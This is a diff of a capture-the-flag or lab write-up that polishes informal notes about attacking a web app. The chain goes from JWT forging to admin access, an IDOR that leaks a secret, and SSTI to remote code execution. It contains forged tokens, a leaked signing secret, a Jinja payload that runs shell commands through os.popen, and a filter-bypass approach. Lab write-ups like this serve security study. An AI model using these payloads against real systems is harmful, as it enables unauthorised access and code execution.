@@ -77,7 +77,7 @@ lets get workspaces , users , settings
 +--------------+------------------------------------------------------+
 ```
 
-NICE CATCH !!! the second step is jwt token forging btw ...
+Good — the second step is JWT token forging.
 
 **workspaces :**
 
@@ -90,22 +90,19 @@ NICE CATCH !!! the second step is jwt token forging btw ...
 +----+-----------+------------+-----------
 ```
 
-it maybe pretty handfull
+could be handy.
 
 ## 3. JWT token forging
 
-lets forge thee toookeennn !!!!!!!!
-the token structure is like this :
+Forge the token. The structure is:
 
 ```
 {"alg":"HS256","typ":"JWT"}.{"sub":"6","email":"test@mail.com","name":"test","role":"member","ws":2,"iat":1793292564,"exp":1793321364}
 ```
 
-lets ask AI to create a python code that generate a token with the same structure than lets change the secret and the role
-done the code is in jwt.py
-an error because i named the file jwt.py
-its the second time doing an error like this am i dumb lmfaaaaaoooo?
-renaming it -> jwt111.py
+Generated a Python script to mint a token with the same structure, then changed the secret
+and the role. (Note: naming the script `jwt.py` shadows Python's `jwt` module and breaks the
+import — renamed it to `jwt111.py`. Lesson: never name a script after a module you import.)
 
 got the forged token :
 
@@ -113,22 +110,15 @@ got the forged token :
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI2IiwiZW1haWwiOiJ0ZXN0QG1haWwuY29tIiwibmFtZSI6InRlc3QiLCJyb2xlIjoiYWRtaW4iLCJ3cyI6MiwiaWF0IjoxNzkzMjk0NTMxLCJleHAiOjE3OTMzMjMzMzF9.j4jIqVkEkEtNs-KBjTfHQoRgUaJxLXqhM6l2sLapDRE
 ```
 
-lets replace it in the console
-first : allow pasting
-done no need for console
-Dev tools -> Application -> storage -> cookies and replace then refresh
-now i see new endpoints as in `Photos/Admin.png`
+Swapped the forged token into the `session` cookie (DevTools → Application → Storage →
+Cookies → replace → refresh). The admin endpoints then appeared (`Photos/Admin.png`).
 
 ## 4. Hunting the vault secret → IDOR
 
-report vault seems sus
-and it says render a template that gives me hints for SSTI ...
-but there is need to the vault secret wtf ?????
-is it in the DB ???????
-is it the same secret of `Photos/secret.png` ????
-i need to get it , its a rate limiter
-i think its in the admin account the one named nadia.admin@flowspace.io
-i may forge a token to access her account
+The Report Vault looks like the sink — it renders a template (SSTI candidate), but the export
+also requires a vault signature. Where does that secret live? Is it in the DB? Is it the one
+seen in `Photos/secret.png`? I needed to obtain it. First guess: the admin (nadia) account —
+so I forged her token too.
 
 her forged token :
 
@@ -136,16 +126,12 @@ her forged token :
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI2IiwiZW1haWwiOiJuYWRpYS5hZG1pbkBmbG93c3BhY2UuaW8iLCJuYW1lIjoiTmFkaWEgSGFkZGFkIiwicm9sZSI6ImFkbWluIiwid3MiOjIsImlhdCI6MTc5MzI5NTU1NSwiZXhwIjoxNzkzMzI0MzU1fQ.VT1XyRp69QDdwODDWF9e_w7fyFMoXh3QzILKy9b54nU
 ```
 
-i cant access the secre !
-wait a minute ...
-there is a hint
+That still didn't expose the secret. Then I noticed a hint on the integrations page:
 
 > Secrets are hidden. Integrations are fetched from /api/integrations/<id>.
 
-are u sure they are hidden ??
-IDOR ???
-lets seeeeeeee
-hell yeaaaaaaaaaaa we got it as in `Photos/IDOR.png`
+"Hidden"? A per-id fetch with no visible authorization check looked like a classic IDOR —
+and it was (`Photos/IDOR.png`):
 
 here it is :
 
@@ -155,8 +141,7 @@ whk_8dad10c4d5f7df09462c3c82886402a9eb384f8c469c1d74
 
 ## 5. SSTI → RCE
 
-now lets get this SSTI
-the request mut be :
+Now the SSTI. The request takes the shape:
 
 ```http
 POST /api/admin/vault/export
@@ -167,18 +152,17 @@ Content-Type: application/json
 {"title":"March export","template":"Report: {{title}} generated {{generated}}"}
 ```
 
-lets test the request
-oh i got the secret wrong its HMAC secret i didnt understand why they didnt use the row secret but i will ask master latter
+First attempt failed: I sent the raw secret as the signature. It has to be an **HMAC of the
+body**, not the secret itself:
 
 ```
 X-Vault-Signature = 57f206b413b9d3921feedbf6c68afb3ff4839e333d67cc16b98ead3f8582d88b
 ```
 
-i didnt understand anything about HMAC-SHA256 tbh
-i will look for it later lets get the lab done rn
-ok the script that master gave me worked
-lets use old ssti payload from Waf Bypass lab
-because if there is a WAF it will bypass and if not it will execute anyway
+With `X-Vault-Signature = HMAC_SHA256(secret, raw_body)` the request was accepted.
+
+First I tried an existing filter-bypass SSTI payload from an earlier lab (if a filter exists
+it gets bypassed; if not, it still executes):
 
 here is the payload from exam4 :
 
@@ -198,17 +182,17 @@ lets build a payload using the same waf bypass method
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo POC > /flag.txt').read() }}
 ```
 
-no fucking manual payload worked . ~ _ - are blocked
-so i wrote the script SSTI.py where these chars are in eval format
-
-here is the flag : **FLAG{ch4in_1d0r_sql1_jwt_hm4c_ss7i_rce}**
+No off-the-shelf payload worked — `.`, `~`, `_`, `-` are all blocked. So I wrote `SSTI.py` to
+assemble the forbidden characters at evaluation time (eval-format), producing a filter-clean
+payload:
 
 ```bash
 python SSTI.py "grep -rni flag /app 2>/dev/null"
 ```
 
-then copy the payload and paste it in tokenme.py
-walaaa
+Pasted the generated payload into the signed request (`tokenme.py`) → RCE, flag recovered:
+
+**FLAG{ch4in_1d0r_sql1_jwt_hm4c_ss7i_rce}**
 
 <!-- ============================================================================= -->
 <!-- EVERYTHING ABOVE THIS LINE = my original DAST notes (black-box, untouched).    -->
